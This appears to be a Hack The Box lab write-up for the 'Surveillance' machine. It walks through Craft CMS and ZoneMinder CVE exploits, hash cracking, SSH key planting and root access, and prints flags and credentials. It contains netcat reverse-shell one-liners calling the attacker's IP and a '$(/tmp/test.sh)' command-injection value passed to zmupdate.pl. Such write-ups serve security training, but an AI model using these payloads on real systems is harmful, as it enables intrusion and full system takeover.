# Surveillance

## Introduction <a href="#introduction" id="introduction"></a>

This writeup details the exploitation process of the "Surveillance" box on Hack The Box. The challenge is categorized as Medium difficulty and involves several stages.

<figure><img src="../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>

## Enumeration

### Nmap

```bash
nmap -A -Pn 10.10.11.253
```

<figure><img src="../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

### Adding Domain to Hosts File

```bash
echo "10.10.11.245 surveillance.htb" | sudo tee -a /etc/hosts
```

<figure><img src="../.gitbook/assets/image (58).png" alt=""><figcaption><p><a href="http://surveillance.htb/">http://surveillance.htb/</a></p></figcaption></figure>

After explore the website, I found that **Powered by Craft CMS** that make me find the vulnerability. Bingo! I found it [https://github.com/Faelian/CraftCMS\_CVE-2023-41892](https://github.com/Faelian/CraftCMS\_CVE-2023-41892)

## Exploitation

```bash
python3 craft-cms.py http://surveillance.htb/
```

<figure><img src="../.gitbook/assets/image (59).png" alt=""><figcaption><p>Web Shell</p></figcaption></figure>

Now, we got web shell. Let go reverse shell.

```bash
#Reverse Shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <YOUR_IP> <YOUR_PORT> >/tmp/f
```

<figure><img src="../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>

Let explore this, I Found **surveillance--2023-10-17-202801--v4.4.14.sql.zip** it might be useful. Let download it.

<figure><img src="../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>

After read it, we found the username and hash password of Database.

<figure><img src="../.gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>

### Crack the password

```bash
echo "39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec" >> hash_2.txt
```

```bash
hashcat -m 1400 hash_2.txt /usr/share/wordlists/rockyou.txt
```

* \-m 1400 (SHA-256 hashes)
* hash\_2.txt (hashed password)
* /usr/share/wordlists/rockyou.txt (wordlist)

<figure><img src="../.gitbook/assets/image (66).png" alt=""><figcaption><p>starcraft122490</p></figcaption></figure>

### Connect with SSH

```bash
ssh matthew@10.10.11.245
```

### User Flag

<figure><img src="../.gitbook/assets/image (68).png" alt=""><figcaption><p>1caf62cf720fba935d79236e8bd7b873</p></figcaption></figure>

## Privilege Escalation

### Create LinPEAS.sh

```bash
#Your localmachines
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh > test.sh

chmod +x test.sh

scp test.sh matthew@IP:/home/matthew
```

### Run LinPEAS.sh

```bash
./test.sh
```

<figure><img src="../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>

### Portforward using SSH

```bash
ssh -L 2222:127.0.0.1:8080 matthew@10.10.11.245
```

<figure><img src="../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>

After see the ZoneMinder login pages, I find the vulnerability and got this one [https://github.com/rvizx/CVE-2023-26035](https://github.com/rvizx/CVE-2023-26035)

### Exploitation

```bash
python3 exploit.py -t <target_url> -ip <attacker-ip> -p <port>
```

<figure><img src="../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>

### Create own SSH

```bash
#Your localmachines
ssh-keygen -t rsa -b 4096 -C "your_email@example.com" 

#Victims
mkdir -p ~/.ssh
chmod 700 ~/.ssh
touch ~/.ssh/authorized_keys
~

#Your localmachines
cat ~/.ssh/id_rsa.pub

#Victims
echo 'your_public_ssh_key' >> ~/.ssh/authorized_keys

#Your localmachines
ssh username@victim_server_ip
```

<figure><img src="../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>

### Check sudo -l

```bash
sudo -l
ls /usr/bin/zm*.pl
```

<figure><img src="../.gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>

And I read the **zmupdate.pl** that I see this find can run the command injection.

```bash
nano /tmp/test.sh
```

```bash
#Reverse Shell
#!/bin/bash
busybox nc <YOUR_IP> <YPUR_PORT> -e sh
```

```bash
chmod +x test.sh
```

### Run Scripts

```bash
sudo /usr/bin/zmupdate.pl --version=1 --user='$(/tmp/test.sh)' --pass=ZoneMinderPassword2023
#Password of the Database from LinPEAS.sh
```

### Root Flag

<figure><img src="../.gitbook/assets/image (76).png" alt=""><figcaption><p>325b3e5a72f2f53f1c95915464c2bf6f</p></figcaption></figure>

## Follow Me

* **LinkedIn**: [https://www.linkedin.com/in/waris-damkham/](https://www.linkedin.com/in/waris-damkham/)
* **Website**: [https://waris-damkham.netlify.app/](https://waris-damkham.netlify.app/#home)
